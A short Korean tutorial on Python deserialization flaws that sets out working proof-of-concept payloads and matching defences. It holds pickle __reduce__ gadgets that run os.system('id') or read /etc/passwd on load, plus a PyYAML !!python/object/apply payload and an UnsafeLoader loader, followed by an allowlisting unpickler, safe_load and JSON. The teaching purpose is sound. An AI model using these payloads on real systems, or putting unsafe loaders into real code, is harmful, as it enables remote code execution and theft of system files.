# 역직렬화 취약점 (Python) — PoC + 방어

허가된 연구 전제. 공격과 방어를 함께.

## pickle RCE (__reduce__ 가젯)
```python
import pickle
import os

class PickleRCE:
    def __reduce__(self):
        return (os.system, ("id",))           # 역직렬화 시 실행될 (callable, args)

def build_payload(path: str = "payload.pkl") -> bytes:
    data = pickle.dumps(PickleRCE())
    with open(path, "wb") as f:
        f.write(data)
    return data

# 피해자 측(취약): pickle.load(open("payload.pkl","rb")) → os.system("id") 실행
```

## pickle RCE (subprocess 변형, 출력 제어)
```python
import pickle
import subprocess

class RevExec:
    def __reduce__(self):
        return (subprocess.check_output, (["cat", "/etc/passwd"],))

payload = pickle.dumps(RevExec())
```

## PyYAML 안전하지 않은 로드 RCE
```python
import yaml

# 취약: yaml.load(data, Loader=yaml.Loader) 또는 구버전 yaml.load(data)
MALICIOUS_YAML = "!!python/object/apply:os.system ['id']"

def unsafe_load(doc: str):
    return yaml.load(doc, Loader=yaml.UnsafeLoader)   # 공격 재현용

def safe_load(doc: str):
    return yaml.safe_load(doc)                         # 방어: 기본 타입만
```

## 방어 — 신뢰경계 역직렬화 차단
```python
import json
import io
import pickle

class RestrictedUnpickler(pickle.Unpickler):
    _ALLOWED = {("builtins", "dict"), ("builtins", "list"), ("builtins", "str")}
    def find_class(self, module, name):
        if (module, name) not in self._ALLOWED:
            raise pickle.UnpicklingError(f"차단된 클래스: {module}.{name}")
        return super().find_class(module, name)

def safe_pickle_loads(data: bytes):
    return RestrictedUnpickler(io.BytesIO(data)).load()

def prefer_json(data: str):
    # 가장 안전: 신뢰불가 입력은 pickle/yaml 대신 json.
    return json.loads(data)
```
